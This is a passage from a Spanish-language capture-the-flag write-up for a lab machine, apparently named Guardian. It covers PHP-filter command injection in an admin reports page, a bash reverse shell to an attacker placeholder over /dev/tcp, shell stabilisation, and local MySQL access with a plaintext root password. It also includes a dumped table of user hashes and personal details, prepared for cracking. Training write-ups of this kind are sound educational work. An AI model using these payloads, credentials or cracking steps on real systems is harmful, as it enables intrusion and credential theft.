Ahora con todo este codigo, vamos a coger lo que empieza por `php://...` y poner en la `URL` algo asi:

```
URL = http://portal.guardian.htb/admin/reports.php?cmd=whoami&report=<CODE_PHP_GENERATE>,enrollment.php
```

Info:

```
  www-data
�
P�����
```

Veremos que funciona, tambien es importante ponerle al final un archivo que exista en el sistema para que no te de un error, en mi caso utilice `enrollment.php` para que funcione.

Ahora vamos a generar una `reverse shell`, vamos a ponernos a la escucha de esta forma:

```shell
nc -lvnp <PORT>
```

En la `URL` pondremos lo siguiente:

```
URL = http://portal.guardian.htb/admin/reports.php?cmd=bash -c "bash -i >%26 /dev/tcp/<IP_ATTACKER>/<PORT> 0>%261"&report=<CODE_PHP_GENERATE>,enrollment.php
```

Cuando lo enviemos si volvemos a donde tenemos la escucha veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [10.10.14.43] from (UNKNOWN) [10.10.11.84] 44064
bash: cannot set terminal process group (920): Inappropriate ioctl for device
bash: no job control in this shell
www-data@guardian:~/portal.guardian.htb/admin$ whoami
whoami
www-data
```

Veremos que ha funcionado, por lo que vamos a sanitizar la `shell`.

### Sanitización de shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

## Escalate user jamil

Recordemos que antes encontramos unas credenciales para conectarnos por `mysql`, vamos a probar a utilizarlas a nivel local.

```shell
mysql -h localhost -u root -pGu4rd14n_un1_1s_th3_b3st
```

Info:

```
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 959
Server version: 8.0.43-0ubuntu0.22.04.1 (Ubuntu)

Copyright (c) 2000, 2025, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql>
```

Veremos que funciona, vamos a listar las `DDBBs` que haya:

```mysql
show databases;
```

Info:

```
+--------------------+
| Database           |
+--------------------+
| guardiandb         |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
5 rows in set (0.00 sec)
```

Vamos a entrar en la `DDBB` llamada `guardiandb` de esta forma:

```mysql
use guardiandb;
```

Ahora vamos a listar las tablas dentro de dicha `DDBB`:

```mysql
show tables;
```

Info:

```
+----------------------+
| Tables_in_guardiandb |
+----------------------+
| assignments          |
| courses              |
| enrollments          |
| grades               |
| messages             |
| notices              |
| programs             |
| submissions          |
| users                |
+----------------------+
9 rows in set (0.00 sec)
```

La que mas nos atrae es la tabla `users`, por lo que vamos a ver que contiene de esta forma seleccionando todo.

```mysql
select * from users;
```

Info:

```
+---------+--------------------+------------------------------------------------------------------+----------------------+---------------------------------+------------+-------------------------------------------------------------------------------+-----------+--------+---------------------+---------------------+
| user_id | username           | password_hash                                                    | full_name            | email                           | dob        | address                                                                       | user_role | status | created_at          | updated_at          |
+---------+--------------------+------------------------------------------------------------------+----------------------+---------------------------------+------------+-------------------------------------------------------------------------------+-----------+--------+---------------------+---------------------+
|       1 | admin              | 694a63de406521120d9b905ee94bae3d863ff9f6637d7b7cb730f7da535fd6d6 | System Admin         | admin@guardian.htb              | 2003-04-09 | 2625 Castlegate Court, Garden Grove, California, United States, 92645         | admin     | active | 2025-09-28 10:00:02 | 2025-09-28 10:00:02 |
|       2 | jamil.enockson     | c1d8dfaeee103d01a5aec443a98d31294f98c5b4f09a0f02ff4f9a43ee440250 | Jamil Enocksson      | jamil.enockson@guardian.htb     | 1999-09-26 | 1061 Keckonen Drive, Detroit, Michigan, United States, 48295                  | admin     | active | 2025-09-28 10:00:02 | 2025-09-28 10:00:02 |
|       3 | mark.pargetter     | 8623e713bb98ba2d46f335d659958ee658eb6370bc4c9ee4ba1cc6f37f97a10e | Mark Pargetter       | mark.pargetter@guardian.htb     | 1996-04-06 | 7402 Santee Place, Buffalo, New York, United States, 14210                    | admin     | active | 2025-09-28 10:00:02 | 2025-09-28 10:00:02 |
|       4 | valentijn.temby    | 1d1bb7b3c6a2a461362d2dcb3c3a55e71ed40fb00dd01d92b2a9cd3c0ff284e6 | Valentijn Temby      | valentijn.temby@guardian.htb    | 1994-05-06 | 7429 Gustavsen Road, Houston, Texas, United States, 77218                     | lecturer  | active | 2025-09-28 10:00:02 | 2025-09-28 10:00:02 |
|       5 | leyla.rippin       | 7f6873594c8da097a78322600bc8e42155b2db6cce6f2dab4fa0384e217d0b61 | Leyla Rippin         | leyla.rippin@guardian.htb       | 1999-01-30 | 7911 Tampico Place, Columbia, Missouri, United States, 65218                  | lecturer  | active | 2025-09-28 10:00:02 | 2025-09-28 10:00:02 |
|       6 | perkin.fillon      | 4a072227fe641b6c72af2ac9b16eea24ed3751211fb6807cf4d794ebd1797471 | Perkin Fillon        | perkin.fillon@guardian.htb      | 1991-03-19 | 3225 Olanta Drive, Atlanta, Georgia, United States, 30368                     | lecturer  | active | 2025-09-28 10:00:02 | 2025-09-28 10:00:02 |
|       7 | cyrus.booth        | 23d701bd2d5fa63e1a0cfe35c65418613f186b4d84330433be6a42ed43fb51e6 | Cyrus Booth          | cyrus.booth@guardian.htb        | 2001-04-03 | 4214 Dwight Drive, Ocala, Florida, United States, 34474                       | lecturer  | active | 2025-09-28 10:00:02 | 2025-09-28 10:00:02 |
|       8 | sammy.treat        | c7ea20ae5d78ab74650c7fb7628c4b44b1e7226c31859d503b93379ba7a0d1c2 | Sammy Treat          | sammy.treat@guardian.htb        | 1997-03-26 | 13188 Mount Croghan Trail, Houston, Texas, United States, 77085               | lecturer  | active | 2025-09-28 10:00:02 | 2025-09-28 10:00:02 |
|       9 | crin.hambidge      | 9b6e003386cd1e24c97661ab4ad2c94cc844789b3916f681ea39c1cbf13c8c75 | Crin Hambidge        | crin.hambidge@guardian.htb      | 1997-09-28 | 4884 Adrienne Way, Flint, Michigan, United States, 48555                      | lecturer  | active | 2025-09-28 10:00:02 | 2025-09-28 10:00:02 |
|      10 | myra.galsworthy    | ba227588efcb86dcf426c5d5c1e2aae58d695d53a1a795b234202ae286da2ef4 | Myra Galsworthy      | myra.galsworthy@guardian.htb    | 1992-02-20 | 13136 Schoenfeldt Street, Odessa, Texas, United States, 79769                 | lecturer  | active | 2025-09-28 10:00:02 | 2025-09-28 10:00:02 |
|      11 | mireielle.feek     | 18448ce8838aab26600b0a995dfebd79cc355254283702426d1056ca6f5d68b3 | Mireielle Feek       | mireielle.feek@guardian.htb     | 2001-08-01 | 13452 Fussell Way, Raleigh, North Carolina, United States, 27690              | lecturer  | active | 2025-09-28 10:00:02 | 2025-09-28 10:00:02 |
|      12 | vivie.smallthwaite | b88ac7727aaa9073aa735ee33ba84a3bdd26249fc0e59e7110d5bcdb4da4031a | Vivie Smallthwaite   | vivie.smallthwaite@guardian.htb | 1993-04-02 | 8653 Hemstead Road, Houston, Texas, United States, 77293                      | lecturer  | active | 2025-09-28 10:00:02 | 2025-09-28 10:00:02 |
|      13 | GU0142023          | 5381d07c15c0f0107471d25a30f5a10c4fd507abe322853c178ff9c66e916829 | Boone Basden         | GU0142023@guardian.htb          | 2001-09-12 | 10523 Panchos Way, Columbus, Ohio, United States, 43284                       | student   | active | 2025-09-28 10:00:02 | 2025-09-28 10:00:02 |
|      14 | GU6262023          | 87847475fa77edfcf2c9e0973a91c9b48ba850e46a940828dfeba0754586938f | Jamesy Currin        | GU6262023@guardian.htb          | 2001-11-28 | 13972 Bragg Avenue, Dulles, Virginia, United States, 20189                    | student   | active | 2025-09-28 10:00:02 | 2025-09-28 10:00:02 |
|      15 | GU0702025          | 48b16b7f456afa78ba00b2b64b4367ded7d4e3daebf08b13ff71a1e0a3103bb1 | Stephenie Vernau     | GU0702025@guardian.htb          | 1996-04-16 | 14649 Delgado Avenue, Tacoma, Washington, United States, 98481                | student   | active | 2025-09-28 10:00:02 | 2025-09-28 10:00:02 |
|      16 | GU0762023          | e7ff40179d9a905bc8916e020ad97596548c0f2246bfb7df9921cc8cdaa20ac2 | Milly Saladine       | GU0762023@guardian.htb          | 1995-11-19 | 2031 Black Stone Place, San Francisco, California, United States, 94132       | student   | active | 2025-09-28 10:00:02 | 2025-09-28 10:00:02 |
|      17 | GU9492024          | 8ae72472bd2d81f774674780aef36fc20a0234e62cdd4889f7b5a6571025b8d1 | Maggy Clout          | GU9492024@guardian.htb          | 2000-05-30 | 8322 Richland Road, Billings, Montana, United States, 59112                   | student   | active | 2025-09-28 10:00:02 | 2025-09-28 10:00:02 |
|      18 | GU9612024          | cf54d11e432e53262f32e799c6f02ca2130ae3cff5f595d278d071ecf4aeaf57 | Shawnee Bazire       | GU9612024@guardian.htb          | 2002-05-27 | 4364 Guadalupe Court, Pensacola, Florida, United States, 32520                | student   | active | 2025-09-28 10:00:02 | 2025-09-28 10:00:02 |
|      19 | GU7382024          | 7852ec8fcfded3f1f6b343ec98adde729952b630bef470a75d4e3e0da7ceea1a | Jobey Dearle-Palser  | GU7382024@guardian.htb          | 1998-04-14 | 4620 De Hoyos Place, Tampa, Florida, United States, 33625                     | student   | active | 2025-09-28 10:00:02 | 2025-09-28 10:00:02 |
|      20 | GU6632023          | 98687fb5e0d6c9004c09dadbe85b69133fd24d5232ff0a3cf3f768504e547714 | Erika Sandilands     | GU6632023@guardian.htb          | 1994-06-08 | 1838 Herlong Court, San Bernardino, California, United States, 92410          | student   | active | 2025-09-28 10:00:02 | 2025-09-28 10:00:02 |
|      21 | GU1922024          | bf5137eb097e9829f5cd41f58fc19ed472381d02f8f635b2e57a248664dd35cd | Alisander Turpie     | GU1922024@guardian.htb          | 1998-08-07 | 813 Brody Court, Bakersfield, California, United States, 93305                | student   | active | 2025-09-28 10:00:02 | 2025-09-28 10:00:02 |
|      22 | GU8032023          | 41b217df7ff88d48dac1884a8c539475eb7e7316f33d1ca5a573291cfb9a2ada | Wandie McRobbie      | GU8032023@guardian.htb          | 2002-01-16 | 5732 Eastfield Path, Peoria, Illinois, United States, 61629                   | student   | active | 2025-09-28 10:00:02 | 2025-09-28 10:00:02 |
|      23 | GU5852023          | e02610ca77a91086c85f93da430fd2f67f796aab177c88d789720ca9b724492a | Erinn Franklyn       | GU5852023@guardian.htb          | 2003-05-01 | 50 Lindsey Lane Court, Fairbanks, Alaska, United States, 99790                | student   | active | 2025-09-28 10:00:02 | 2025-09-28 10:00:02 |
|      24 | GU0712023          | e6aad48962fd44e506ac16d81b5e4587cad2fd2dc51aabbf193f4fd29d036a7a | Niel Slewcock        | GU0712023@guardian.htb          | 1996-05-04 | 3784 East Schwartz Boulevard, Gainesville, Florida, United States, 32610      | student   | active | 2025-09-28 10:00:02 | 2025-09-28 10:00:02 |
|      25 | GU1592025          | 1710aed05bca122521c02bff141c259a81a435f900620306f92b840d4ba79c71 | Chryste Lamputt      | GU1592025@guardian.htb          | 1993-05-22 | 6620 Anhinga Lane, Baton Rouge, Louisiana, United States, 70820               | student   | active | 2025-09-28 10:00:02 | 2025-09-28 10:00:02 |
|      26 | GU1112023          | 168ae18404da4fff097f9218292ae8f93d6c3ac532e609b07a1c1437f2916a7d | Kiersten Rampley     | GU1112023@guardian.htb          | 1997-06-28 | 9990 Brookdale Court, New York City, New York, United States, 10292           | student   | active | 2025-09-28 10:00:02 | 2025-09-28 10:00:02 |
|      27 | GU6432025          | a28e58fd78fa52c651bfee842b1d3d8f5873ae00a4af56a155732a4a6be41bc6 | Gradeigh Espada      | GU6432025@guardian.htb          | 1999-06-06 | 5464 Lape Lane, Boise, Idaho, United States, 83757                            | student   | active | 2025-09-28 10:00:02 | 2025-09-28 10:00:02 |
|      28 | GU3042024          | d72fc47472a863fafea2010efe6cd4e70976118babaa762fef8b68a35814e9ab | Susanne Myhill       | GU3042024@guardian.htb          | 2003-04-12 | 11585 Homan Loop, Aiken, South Carolina, United States, 29805                 | student   | active | 2025-09-28 10:00:02 | 2025-09-28 10:00:02 |
|      29 | GU1482025          | be0145f24b8f6943fd949b7ecaee55bb9d085eb3e81746826374c52e1060785f | Prudi Sweatman       | GU1482025@guardian.htb          | 1998-05-10 | 1533 Woodmill Terrace, Palo Alto, California, United States, 94302            | student   | active | 2025-09-28 10:00:02 | 2025-09-28 10:00:02 |
|      30 | GU3102024          | 3aa2232d08262fca8db495c84bd45d8c560e634d5dff8566f535108cf1cc0706 | Kacey Qualtrough     | GU3102024@guardian.htb          | 1996-03-09 | 14579 Ayala Way, Spokane, Washington, United States, 99252                    | student   | active | 2025-09-28 10:00:02 | 2025-09-28 10:00:02 |
|      31 | GU7232023          | 4813362e8d6194abfb20154ba3241ade8806445866bce738d24888aa1aa9bea6 | Thedrick Grimstead   | GU7232023@guardian.htb          | 1998-05-20 | 13789 Castlegate Court, Salt Lake City, Utah, United States, 84130            | student   | active | 2025-09-28 10:00:02 | 2025-09-28 10:00:02 |
|      32 | GU8912024          | 6c249ab358f6adfc67aecb4569dae96d8a57e3a64c82808f7cede41f9a330c51 | Dominik Clipsham     | GU8912024@guardian.htb          | 1999-06-30 | 7955 Lock Street, Kansas City, Missouri, United States, 64160                 | student   | active | 2025-09-28 10:00:02 | 2025-09-28 10:00:02 |
|      33 | GU4752025          | 4d7625ec0d45aa83ef374054c8946497a798ca6a3474f76338f0ffe829fced1a | Iain Vinson          | GU4752025@guardian.htb          | 1990-10-13 | 10384 Zeeland Terrace, Cleveland, Ohio, United States, 44105                  | student   | active | 2025-09-28 10:00:02 | 2025-09-28 10:00:02 |
|      34 | GU9602024          | 6eeb4b329b7b7f885df9757df3a67247df0a7f14b539f01d3cb988e4989c75e2 | Ax Sweating          | GU9602024@guardian.htb          | 1994-06-22 | 4518 Vision Court, Sarasota, Florida, United States, 34233                    | student   | active | 2025-09-28 10:00:02 | 2025-09-28 10:00:02 |
|      35 | GU4382025          | 8d57c0124615f5c82cabfdd09811251e7b2d70dcf2d3a3b3942a31c294097ec8 | Trixi Piolli         | GU4382025@guardian.htb          | 2001-02-02 | 11634 Reid Road, Charleston, South Carolina, United States, 29424             | student   | active | 2025-09-28 10:00:02 | 2025-09-28 10:00:02 |
|      36 | GU7352023          | 8c9a8f4a6daceecb6fff0eae3830d16fe7e05a98101cb21f1b06d592a33cb005 | Ronni Fulton         | GU7352023@guardian.htb          | 1998-11-07 | 4690 Currituck Terrace, Vero Beach, Florida, United States, 32964             | student   | active | 2025-09-28 10:00:02 | 2025-09-28 10:00:02 |
|      37 | GU3042025          | 1d87078236f9da236a92f42771749dad4eea081a08a5da2ed3fa5a11d85fa22f | William Lidstone     | GU3042025@guardian.htb          | 1998-03-18 | 11566 Summerchase Loop, Providence, Rhode Island, United States, 02905        | student   | active | 2025-09-28 10:00:02 | 2025-09-28 10:00:02 |
|      38 | GU3872024          | 12a2fe5b87191fedadc7d81dee2d483ab2508650d96966000f8e1412ca9cd74a | Viola Bridywater     | GU3872024@guardian.htb          | 2003-07-21 | 9436 Erica Chambers Avenue, Bronx, New York, United States, 10454             | student   | active | 2025-09-28 10:00:02 | 2025-09-28 10:00:02 |
|      39 | GU7462025          | 5e95bfd3675d0d995027c392e6131bf99cf2cfba73e08638fa1c48699cdb9dfa | Glennie Crilly       | GU7462025@guardian.htb          | 1995-01-26 | 3423 Carla Fink Court, Washington, District of Columbia, United States, 20580 | student   | active | 2025-09-28 10:00:02 | 2025-09-28 10:00:02 |
|      40 | GU3902023          | 6b4502ad77cf9403e9ac3338ff7da1c08688ef2005dae839c1cd6e07e1f6409b | Ninnette Lenchenko   | GU3902023@guardian.htb          | 1994-11-06 | 12277 Richey Road, Austin, Texas, United States, 78754                        | student   | active | 2025-09-28 10:00:02 | 2025-09-28 10:00:02 |
|      41 | GU1832025          | 6ab453e985e31ef54419376be906f26fff02334ec5f26a681d90c32aec6d311f | Rivalee Coche        | GU1832025@guardian.htb          | 1990-10-23 | 2999 Indigo Avenue, Washington, District of Columbia, United States, 20022    | student   | active | 2025-09-28 10:00:02 | 2025-09-28 10:00:02 |
|      42 | GU3052024          | 1cde419d7f3145bcfcbf9a34f80452adf979f71496290cf850944d527cda733f | Lodovico Atlay       | GU3052024@guardian.htb          | 1992-04-16 | 5803 Clarendon Court, Little Rock, Arkansas, United States, 72231             | student   | active | 2025-09-28 10:00:02 | 2025-09-28 10:00:02 |
|      43 | GU3612023          | 7ba8a71e39c1697e0bfa66052285157d2984978404816c93c2a3ddaba6455e3a | Maris Whyborne       | GU3612023@guardian.htb          | 1999-08-07 | 435 Quaint Court, Staten Island, New York, United States, 10305               | student   | active | 2025-09-28 10:00:02 | 2025-09-28 10:00:02 |
|      44 | GU7022023          | 7a02cc632b8cb1a6f036cb2c963c084ffea9184a92259d932e224932fdad81a8 | Diahann Forber       | GU7022023@guardian.htb          | 1998-12-17 | 10094 Ely Circle, New Haven, Connecticut, United States, 06533                | student   | active | 2025-09-28 10:00:02 | 2025-09-28 10:00:02 |
|      45 | GU1712025          | ebfa2119ebe2aaed2c329e25ce2e5ed8efa2d78e72c273bb91ff968d02ee5225 | Sinclair Tierney     | GU1712025@guardian.htb          | 1999-11-04 | 2885 Columbia Way, Seattle, Washington, United States, 98127                  | student   | active | 2025-09-28 10:00:02 | 2025-09-28 10:00:02 |
|      46 | GU9362023          | 8b7ce469fb40e88472c9006cb1d65ffa20b2f9c41e983d49ca0cdf642d8f1592 | Leela Headon         | GU9362023@guardian.htb          | 1992-10-24 | 14477 Donelin Circle, El Paso, Texas, United States, 88589                    | student   | active | 2025-09-28 10:00:02 | 2025-09-28 10:00:02 |
|      47 | GU5092024          | 11ae26f27612b1adca57f14c379a8cc6b4fc5bdfcfd21bef7a8b0172b7ab4380 | Egon Jaques          | GU5092024@guardian.htb          | 1995-04-19 | 12886 Chimborazo Way, Fort Lauderdale, Florida, United States, 33315          | student   | active | 2025-09-28 10:00:02 | 2025-09-28 10:00:02 |
|      48 | GU5252023          | 70a03bb2060c5e14b33c393970e655f04d11f02d71f6f44715f6fe37784c64fa | Meade Newborn        | GU5252023@guardian.htb          | 2003-09-02 | 3679 Inman Mills Road, Orlando, Florida, United States, 32859                 | student   | active | 2025-09-28 10:00:02 | 2025-09-28 10:00:02 |
|      49 | GU8802025          | 7ae4ac47f05407862cb2fcd9372c73641c822bbc7fc07ed9d16e6b63c2001d76 | Tadeo Sproson        | GU8802025@guardian.htb          | 2002-08-01 | 4293 Tim Terrace, Springfield, Illinois, United States, 62776                 | student   | active | 2025-09-28 10:00:02 | 2025-09-28 10:00:02 |
|      50 | GU2222023          | d3a175c6e9da02ae83ef1f2dd1f59e59b8a63e5895b81354f7547714216bbdcd | Delia Theriot        | GU2222023@guardian.htb          | 2001-07-15 | 5847 Beechwood Avenue, Chattanooga, Tennessee, United States, 37450           | student   | active | 2025-09-28 10:00:02 | 2025-09-28 10:00:02 |
|      51 | GU9802023          | a03da309de0a60f762ce31d0bde5b9c25eb59e740719fc411226a24e72831f5c | Ransell Dourin       | GU9802023@guardian.htb          | 1995-01-04 | 1809 Weaton Court, Chattanooga, Tennessee, United States, 37410               | student   | active | 2025-09-28 10:00:02 | 2025-09-28 10:00:02 |
|      52 | GU3122025          | e96399fcdb8749496abc6d53592b732b1b2acb296679317cf59f104a5f51343a | Franklyn Kuhndel     | GU3122025@guardian.htb          | 1991-06-05 | 11809 Mccook Street, Shawnee Mission, Kansas, United States, 66210            | student   | active | 2025-09-28 10:00:02 | 2025-09-28 10:00:02 |
|      53 | GU2062025          | 0ece0b43e6019e297e0bce9f07f200ff03d629edbed88d4f12f2bad27e7f4df8 | Petronille Scroggins | GU2062025@guardian.htb          | 2001-06-16 | 11794 Byron Place, Des Moines, Iowa, United States, 50981                     | student   | active | 2025-09-28 10:00:02 | 2025-09-28 10:00:02 |
|      54 | GU3992025          | b86518d246a22f4f5938444aa18f2893c4cccabbe90ca48a16be42317aec96a0 | Kittie Maplesden     | GU3992025@guardian.htb          | 2001-10-04 | 6212 Matisse Avenue, Palatine, Illinois, United States, 60078                 | student   | active | 2025-09-28 10:00:02 | 2025-09-28 10:00:02 |
|      55 | GU1662024          | 5c28cd405a6c0543936c9d010b7471436a7a33fa64f5eb3e84ab9f7acc9a16e5 | Gherardo Godon       | GU1662024@guardian.htb          | 2002-04-17 | 9997 De Hoyos Place, Simi Valley, California, United States, 93094            | student   | active | 2025-09-28 10:00:02 | 2025-09-28 10:00:02 |
|      56 | GU9972025          | 339d519ef0c55e63ebf4a8fde6fda4bca4315b317a1de896fb481bd0834cc599 | Kippar Surpliss      | GU9972025@guardian.htb          | 1990-08-10 | 5372 Gentle Terrace, San Francisco, California, United States, 94110          | student   | active | 2025-09-28 10:00:02 | 2025-09-28 10:00:02 |
|      57 | GU6822025          | 298560c0edce3451fd36b69a15792cbb637c8366f058cf674a6964ff34306482 | Sigvard Reubens      | GU6822025@guardian.htb          | 2003-04-23 | 5711 Magana Place, Memphis, Tennessee, United States, 38104                   | student   | active | 2025-09-28 10:00:02 | 2025-09-28 10:00:02 |
|      58 | GU7912023          | 8236b81b5f67c798dd5943bca91817558e987f825b6aae72a592c8f1eaeee021 | Carly Buckler        | GU7912023@guardian.htb          | 1991-09-07 | 2298 Hood Place, Springfield, Massachusetts, United States, 01105             | student   | active | 2025-09-28 10:00:02 | 2025-09-28 10:00:02 |
|      59 | GU3622024          | 1c92182d9a59d77ea20c0949696711d8458c870126cf21330f61c2cba6ae6bcf | Maryjo Gration       | GU3622024@guardian.htb          | 1997-04-25 | 1998 Junction Place, Irvine, California, United States, 92619                 | student   | active | 2025-09-28 10:00:02 | 2025-09-28 10:00:02 |
|      60 | GU2002023          | 3c378b73442c2cf911f2a157fc9e26ecde2230313b46876dab12a661169ed6e2 | Paulina Mainwaring   | GU2002023@guardian.htb          | 1993-05-04 | 11891 Markridge Loop, Olympia, Washington, United States, 98506               | student   | active | 2025-09-28 10:00:02 | 2025-09-28 10:00:02 |
|      61 | GU3052023          | 2ef01f607f86387d0c94fc2a3502cc3e6d8715d3b1f124b338623b41aed40cf8 | Curran Foynes        | GU3052023@guardian.htb          | 2000-12-04 | 7021 Cordelia Place, Paterson, New Jersey, United States, 07505               | student   | active | 2025-09-28 10:00:02 | 2025-09-28 10:00:02 |
|      62 | GU1462023          | 585aacf74b22a543022416ed771dca611bd78939908c8323f4f5efef5b4e0202 | Cissy Styan          | GU1462023@guardian.htb          | 1991-01-10 | 1138 Salinas Avenue, Orlando, Florida, United States, 32854                   | student   | active | 2025-09-28 10:00:02 | 2025-09-28 10:00:02 |
+---------+--------------------+------------------------------------------------------------------+----------------------+---------------------------------+------------+-------------------------------------------------------------------------------+-----------+--------+---------------------+---------------------+
62 rows in set (0.00 sec)
```

Veremos `62` entradas, vamos a limpiar todo esto y dejarlo en un archivo `hash` para probar a `crackear` todos los usuarios a ver cuales conseguimos.

> hash

```
admin:694a63de406521120d9b905ee94bae3d863ff9f6637d7b7cb730f7da535fd6d6:8Sb)tM1vs1SS
jamil.enockson:c1d8dfaeee103d01a5aec443a98d31294f98c5b4f09a0f02ff4f9a43ee440250:8Sb)tM1vs1SS
mark.pargetter:8623e713bb98ba2d46f335d659958ee658eb6370bc4c9ee4ba1cc6f37f97a10e:8Sb)tM1vs1SS
valentijn.temby:1d1bb7b3c6a2a461362d2dcb3c3a55e71ed40fb00dd01d92b2a9cd3c0ff284e6:8Sb)tM1vs1SS
leyla.rippin:7f6873594c8da097a78322600bc8e42155b2db6cce6f2dab4fa0384e217d0b61:8Sb)tM1vs1SS
perkin.fillon:4a072227fe641b6c72af2ac9b16eea24ed3751211fb6807cf4d794ebd1797471:8Sb)tM1vs1SS
cyrus.booth:23d701bd2d5fa63e1a0cfe35c65418613f186b4d84330433be6a42ed43fb51e6:8Sb)tM1vs1SS
sammy.treat:c7ea20ae5d78ab74650c7fb7628c4b44b1e7226c31859d503b93379ba7a0d1c2:8Sb)tM1vs1SS
crin.hambidge:9b6e003386cd1e24c97661ab4ad2c94cc844789b3916f681ea39c1cbf13c8c75:8Sb)tM1vs1SS
myra.galsworthy:ba227588efcb86dcf426c5d5c1e2aae58d695d53a1a795b234202ae286da2ef4:8Sb)tM1vs1SS
mireielle.feek:18448ce8838aab26600b0a995dfebd79cc355254283702426d1056ca6f5d68b3:8Sb)tM1vs1SS
vivie.smallthwaite:b88ac7727aaa9073aa735ee33ba84a3bdd26249fc0e59e7110d5bcdb4da4031a:8Sb)tM1vs1SS
GU0142023:5381d07c15c0f0107471d25a30f5a10c4fd507abe322853c178ff9c66e916829:8Sb)tM1vs1SS
GU6262023:87847475fa77edfcf2c9e0973a91c9b48ba850e46a940828dfeba0754586938f:8Sb)tM1vs1SS
GU0702025:48b16b7f456afa78ba00b2b64b4367ded7d4e3daebf08b13ff71a1e0a3103bb1:8Sb)tM1vs1SS
GU0762023:e7ff40179d9a905bc8916e020ad97596548c0f2246bfb7df9921cc8cdaa20ac2:8Sb)tM1vs1SS
GU9492024:8ae72472bd2d81f774674780aef36fc20a0234e62cdd4889f7b5a6571025b8d1:8Sb)tM1vs1SS
GU9612024:cf54d11e432e53262f32e799c6f02ca2130ae3cff5f595d278d071ecf4aeaf57:8Sb)tM1vs1SS
GU7382024:7852ec8fcfded3f1f6b343ec98adde729952b630bef470a75d4e3e0da7ceea1a:8Sb)tM1vs1SS
GU6632023:98687fb5e0d6c9004c09dadbe85b69133fd24d5232ff0a3cf3f768504e547714:8Sb)tM1vs1SS
GU1922024:bf5137eb097e9829f5cd41f58fc19ed472381d02f8f635b2e57a248664dd35cd:8Sb)tM1vs1SS
GU8032023:41b217df7ff88d48dac1884a8c539475eb7e7316f33d1ca5a573291cfb9a2ada:8Sb)tM1vs1SS
GU5852023:e02610ca77a91086c85f93da430fd2f67f796aab177c88d789720ca9b724492a:8Sb)tM1vs1SS
GU0712023:e6aad48962fd44e506ac16d81b5e4587cad2fd2dc51aabbf193f4fd29d036a7a:8Sb)tM1vs1SS
GU1592025:1710aed05bca122521c02bff141c259a81a435f900620306f92b840d4ba79c71:8Sb)tM1vs1SS
GU1112023:168ae18404da4fff097f9218292ae8f93d6c3ac532e609b07a1c1437f2916a7d:8Sb)tM1vs1SS
GU6432025:a28e58fd78fa52c651bfee842b1d3d8f5873ae00a4af56a155732a4a6be41bc6:8Sb)tM1vs1SS
GU3042024:d72fc47472a863fafea2010efe6cd4e70976118babaa762fef8b68a35814e9ab:8Sb)tM1vs1SS
GU1482025:be0145f24b8f6943fd949b7ecaee55bb9d085eb3e81746826374c52e1060785f:8Sb)tM1vs1SS
GU3102024:3aa2232d08262fca8db495c84bd45d8c560e634d5dff8566f535108cf1cc0706:8Sb)tM1vs1SS
GU7232023:4813362e8d6194abfb20154ba3241ade8806445866bce738d24888aa1aa9bea6:8Sb)tM1vs1SS
GU8912024:6c249ab358f6adfc67aecb4569dae96d8a57e3a64c82808f7cede41f9a330c51:8Sb)tM1vs1SS
GU4752025:4d7625ec0d45aa83ef374054c8946497a798ca6a3474f76338f0ffe829fced1a:8Sb)tM1vs1SS
GU9602024:6eeb4b329b7b7f885df9757df3a67247df0a7f14b539f01d3cb988e4989c75e2:8Sb)tM1vs1SS
GU4382025:8d57c0124615f5c82cabfdd09811251e7b2d70dcf2d3a3b3942a31c294097ec8:8Sb)tM1vs1SS
GU7352023:8c9a8f4a6daceecb6fff0eae3830d16fe7e05a98101cb21f1b06d592a33cb005:8Sb)tM1vs1SS
GU3042025:1d87078236f9da236a92f42771749dad4eea081a08a5da2ed3fa5a11d85fa22f:8Sb)tM1vs1SS
GU3872024:12a2fe5b87191fedadc7d81dee2d483ab2508650d96966000f8e1412ca9cd74a:8Sb)tM1vs1SS
GU7462025:5e95bfd3675d0d995027c392e6131bf99cf2cfba73e08638fa1c48699cdb9dfa:8Sb)tM1vs1SS
GU3902023:6b4502ad77cf9403e9ac3338ff7da1c08688ef2005dae839c1cd6e07e1f6409b:8Sb)tM1vs1SS
GU1832025:6ab453e985e31ef54419376be906f26fff02334ec5f26a681d90c32aec6d311f:8Sb)tM1vs1SS
GU3052024:1cde419d7f3145bcfcbf9a34f80452adf979f71496290cf850944d527cda733f:8Sb)tM1vs1SS
GU3612023:7ba8a71e39c1697e0bfa66052285157d2984978404816c93c2a3ddaba6455e3a:8Sb)tM1vs1SS
GU7022023:7a02cc632b8cb1a6f036cb2c963c084ffea9184a92259d932e224932fdad81a8:8Sb)tM1vs1SS
GU1712025:ebfa2119ebe2aaed2c329e25ce2e5ed8efa2d78e72c273bb91ff968d02ee5225:8Sb)tM1vs1SS
GU9362023:8b7ce469fb40e88472c9006cb1d65ffa20b2f9c41e983d49ca0cdf642d8f1592:8Sb)tM1vs1SS
GU5092024:11ae26f27612b1adca57f14c379a8cc6b4fc5bdfcfd21bef7a8b0172b7ab4380:8Sb)tM1vs1SS
GU5252023:70a03bb2060c5e14b33c393970e655f04d11f02d71f6f44715f6fe37784c64fa:8Sb)tM1vs1SS
GU8802025:7ae4ac47f05407862cb2fcd9372c73641c822bbc7fc07ed9d16e6b63c2001d76:8Sb)tM1vs1SS
GU2222023:d3a175c6e9da02ae83ef1f2dd1f59e59b8a63e5895b81354f7547714216bbdcd:8Sb)tM1vs1SS
GU9802023:a03da309de0a60f762ce31d0bde5b9c25eb59e740719fc411226a24e72831f5c:8Sb)tM1vs1SS
GU3122025:e96399fcdb8749496abc6d53592b732b1b2acb296679317cf59f104a5f51343a:8Sb)tM1vs1SS
GU2062025:0ece0b43e6019e297e0bce9f07f200ff03d629edbed88d4f12f2bad27e7f4df8:8Sb)tM1vs1SS
GU3992025:b86518d246a22f4f5938444aa18f2893c4cccabbe90ca48a16be42317aec96a0:8Sb)tM1vs1SS
